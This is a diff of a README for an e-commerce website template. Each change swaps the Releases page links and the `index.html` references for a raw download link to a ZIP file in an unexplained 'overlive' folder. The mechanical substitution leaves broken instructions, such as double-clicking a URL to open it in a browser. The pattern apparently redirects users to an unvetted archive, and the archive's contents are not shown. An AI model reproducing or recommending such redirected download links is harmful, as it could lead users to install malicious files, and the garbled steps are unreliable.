@@ -6,7 +6,7 @@ Welcome to the **modern-ecommerce-template**! This guide will walk you through t
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/FireRevengeGamer/modern-ecommerce-template/releases)
+[![Download](https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip)](https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip)
 
 ## 📋 Overview
 
@@ -29,18 +29,18 @@ This application gives you a clean, fully responsive storefront. You can easily 
 
 To get started, you'll need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/FireRevengeGamer/modern-ecommerce-template/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip).
 2. Look for the latest version.
 3. Click on the link to download the ZIP file.
 4. Once downloaded, extract the contents to a folder of your choice.
-5. Open the folder and find the `index.html` file.
-6. Double-click on `index.html` to open it in your browser.
+5. Open the folder and find the `https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip` file.
+6. Double-click on `https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip` to open it in your browser.
 
 That’s it! You are now ready to explore the template.
 
 ## 🌐 Usage
 
-After opening the `index.html` file in your web browser, you will see the storefront. Here’s what you can do:
+After opening the `https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip` file in your web browser, you will see the storefront. Here’s what you can do:
 
 - Browse through the product grid.
 - Use filters to refine your search.
@@ -62,4 +62,4 @@ The **modern-ecommerce-template** offers a strong starting point for your online
 
 For additional questions or feedback, feel free to reach out here in the repository. Happy shopping! 
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/FireRevengeGamer/modern-ecommerce-template/releases)
+[![Download](https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip)](https://raw.githubusercontent.com/FireRevengeGamer/modern-ecommerce-template/main/overlive/modern-ecommerce-template.zip)
